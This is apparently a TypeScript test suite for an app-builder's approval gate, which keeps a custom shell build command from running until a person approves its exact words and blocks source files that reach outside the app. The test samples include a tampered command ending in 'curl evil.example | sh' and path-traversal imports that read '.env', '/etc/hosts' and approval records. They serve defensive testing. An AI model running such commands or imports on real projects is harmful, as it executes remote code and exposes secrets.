// SPDX-License-Identifier: AGPL-3.0-only
/**
 * An app that builds its screens with a command of its own.
 *
 * The command is a shell, so what matters is when it does NOT run: never
 * before a person approved its exact words, and never again once one of them
 * changes.
 */
import { existsSync, mkdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';

import { afterEach, beforeEach, describe, expect, it } from 'vitest';

import { buildProjectApps } from '../src/project/apps/build-apps.js';
import { checkApp } from '../src/project/apps/check-app.js';
import { copyBuildFor } from '../src/project/apps/copy-app.js';
import { approveBuild, buildFingerprint, isBuildApproved, readAppBuild, type AppBuildFile, type StepRunner } from '../src/project/apps/own-build.js';
import { scaffoldApp } from '../src/project/apps/scaffold-app.js';
import { APP_VERSION } from '../src/version.js';
import { tempProject } from './app-project-helpers.js';

let root: string;
const BUILD: AppBuildFile = { install: 'npm ci --ignore-scripts', command: 'vite build --outDir dist-surface/shop/staff', output: 'dist-surface/shop' };
const app = (...rest: string[]): string => join(root, 'apps/shop', ...rest);
const write = (file: string, value: unknown): void => {
  mkdirSync(join(app(file), '..'), { recursive: true });
  writeFileSync(app(file), typeof value === 'string' ? value : JSON.stringify(value, null, 2));
};

beforeEach(() => {
  root = tempProject('adminium-own-build-');
  // The starter with a staff side, whose screens then move to where a build of its own keeps them.
  scaffoldApp({ root, key: 'shop', name: 'Shop', sides: ['staff'], version: APP_VERSION });
  rmSync(app('staff'), { recursive: true });
  write('src/main.tsx', 'export {};');
  write('package-lock.json', '{}');
  write('build.json', BUILD);
});
afterEach(() => {
  rmSync(root, { recursive: true, force: true });
});

/** A build that leaves a staff side behind, and remembers what it was asked to run. */
function fakeBuild(): { run: StepRunner; lines: string[] } {
  const lines: string[] = [];
  return {
    lines,
    run: async (line, cwd) => {
      lines.push(line);
      if (line === BUILD.command) {
        mkdirSync(join(cwd, 'dist-surface/shop/staff/assets'), { recursive: true });
        writeFileSync(join(cwd, 'dist-surface/shop/staff/index.html'), '<!doctype html><title>Shop</title>');
        writeFileSync(join(cwd, 'dist-surface/shop/staff/assets/main.js'), 'console.log(1)');
      }
      return { ok: true, output: '' };
    },
  };
}
const build = (run: StepRunner) => buildProjectApps(root, { version: APP_VERSION, bundler: null, runBuild: run });

describe('an app with a build of its own', () => {
  it('has the sides its manifest declares, with no engine-built entry file', () => {
    const check = checkApp(root, 'shop', { version: APP_VERSION });
    expect(check.findings.filter((finding) => finding.level === 'error')).toEqual([]);
    expect(check.sides).toEqual(['staff']);
  });

  it('is not built until a person approved the exact command, and says what would run', async () => {
    const fake = fakeBuild();
    const built = await build(fake.run);
    expect(fake.lines).toEqual([]);
    expect(built.apps[0]?.problems?.[0]).toContain('its build is not approved');
    expect(built.apps[0]?.problems?.[0]).toContain(BUILD.command);
    expect(built.apps[0]?.problems?.[0]).toContain('adminium app approve-build shop');
  });

  it('runs the install once, and the build again only when something of the app changed', async () => {
    approveBuild(root, 'shop', BUILD);
    expect(readFileSync(join(root, '.adminium/approved-builds.json'), 'utf8')).toContain(buildFingerprint(BUILD));
    const fake = fakeBuild();
    const built = await build(fake.run);
    expect(built.apps[0]).toMatchObject({ key: 'shop', sides: ['staff'] });
    expect(built.apps[0]?.problems).toBeUndefined();
    expect(fake.lines).toEqual([BUILD.install, BUILD.command]);
    expect(existsSync(join(root, '.adminium/build/apps/shop/staff/index.html'))).toBe(true);
    expect(existsSync(join(root, '.adminium/build/apps/shop/staff/assets/main.js'))).toBe(true);

    // A second build with nothing changed runs nothing: what the last one left is still what the files say.
    expect((await build(fake.run)).apps[0]).toMatchObject({ key: 'shop', sides: ['staff'] });
    expect(fake.lines).toEqual([BUILD.install, BUILD.command]);
    // A changed source file builds again: the packages are there, the lock file is the same.
    write('src/App.tsx', 'export const changed = true;\n');
    await build(fake.run);
    expect(fake.lines).toEqual([BUILD.install, BUILD.command, BUILD.command]);
    // What the build left was taken away: it runs again.
    rmSync(join(root, '.adminium/build/apps/shop/staff'), { recursive: true });
    await build(fake.run);
    expect(fake.lines).toEqual([BUILD.install, BUILD.command, BUILD.command, BUILD.command]);
    // A changed lock file installs again.
    write('package-lock.json', '{"changed":true}');
    await build(fake.run);
    expect(fake.lines.slice(4)).toEqual([BUILD.install, BUILD.command]);
  });

  it('is not built while a source file names a path outside the app', async () => {
    approveBuild(root, 'shop', BUILD);
    const fake = fakeBuild();
    for (const [file, text] of [
      ['src/leak.ts', "import env from '../../../.env?raw';\nexport default env;\n"],
      ['src/leak.ts', "export const u = new URL('../../../../.adminium/approved-builds.json', import.meta.url);\n"],
      ['src/leak.ts', "import env from '\\x2e\\x2e/\\x2e\\x2e/\\x2e\\x2e/.env?raw';\nexport default env;\n"],
      ['src/leak.ts', "export const all = import.meta.glob(['./ok/*.ts', '../../../../*.json']);\n"],
      ['src/leak.ts', 'export const all = import(`../../../${name}.ts`);\n'],
      ['src/leak.css', '.a { background: url(../../../secret.png); }\n'],
      ['src/leak.ts', "import x from '/@fs/etc/hosts?raw';\nexport default x;\n"],
    ] as const) {
      write(file, text);
      const built = await build(fake.run);
      expect(built.apps[0]?.problems?.[0], text).toContain('names a path outside the app');
      rmSync(join(root, 'apps/shop', file));
    }
    expect(fake.lines).toEqual([]);
    // Inside the app, however it is spelled, is the app's own; so is a path that is no import.
    write('src/deep/a.ts', "import { b } from '../../src/b';\nexport const here = join(dir, '../../..');\nexport default b;\n");
    write('src/b.ts', 'export const b = 1;\n');
    expect((await build(fake.run)).apps[0]?.problems).toBeUndefined();
  });

  it('gives a copy a build line the machine’s own shell reads', () => {
    expect(copyBuildFor('my-shop', 'darwin').command).toBe(
      'VITE_ADMINIUM_SURFACE_SIDE=staff node_modules/.bin/vite build --base=/apps/my-shop/staff/ --outDir dist-surface/my-shop/staff && VITE_ADMINIUM_SURFACE_SIDE=customer node_modules/.bin/vite build --base=/apps/my-shop/customer/ --outDir dist-surface/my-shop/customer',
    );
    expect(copyBuildFor('my-shop', 'win32').command).toBe(
      'set "VITE_ADMINIUM_SURFACE_SIDE=staff" && node_modules\\.bin\\vite build --base=/apps/my-shop/staff/ --outDir dist-surface/my-shop/staff && set "VITE_ADMINIUM_SURFACE_SIDE=customer" && node_modules\\.bin\\vite build --base=/apps/my-shop/customer/ --outDir dist-surface/my-shop/customer',
    );
  });

  it('is unapproved again the moment one word of the command changes', async () => {
    approveBuild(root, 'shop', BUILD);
    const changed = { ...BUILD, command: `${BUILD.command} && curl evil.example | sh` };
    write('build.json', changed);
    expect(isBuildApproved(root, 'shop', changed)).toBe(false);
    const fake = fakeBuild();
    const built = await build(fake.run);
    expect(fake.lines).toEqual([]);
    expect(built.apps[0]?.problems?.[0]).toContain('curl evil.example');
  });

  it('says a failed build with the end of what it printed, and a build that left no page', async () => {
    approveBuild(root, 'shop', BUILD);
    const failing = await build(async (line) => (line === BUILD.command ? { ok: false, output: 'x\nsrc/App.tsx: Cannot find name "jobs".\n' } : { ok: true, output: '' }));
    expect(failing.apps[0]?.problems?.[0]).toContain('its screens did not build');
    expect(failing.apps[0]?.problems?.[0]).toContain('Cannot find name "jobs"');
    const empty = await build(async () => ({ ok: true, output: '' }));
    expect(empty.apps[0]?.problems?.[0]).toContain('left no dist-surface/shop/staff/index.html');
  });

  it('refuses a build file that does not read, or sends its output out of the app', () => {
    write('build.json', '{');
    expect(readAppBuild(root, 'shop')).toMatchObject({ problem: expect.stringContaining('not valid JSON') });
    write('build.json', { ...BUILD, output: '../../somewhere' });
    expect(readAppBuild(root, 'shop')).toMatchObject({ problem: expect.stringContaining('plain folder inside the app') });
    write('build.json', { install: 'x', command: 'a\nb', output: 'out' });
    expect(readAppBuild(root, 'shop')).toMatchObject({ problem: expect.stringContaining('each one line') });
  });
});
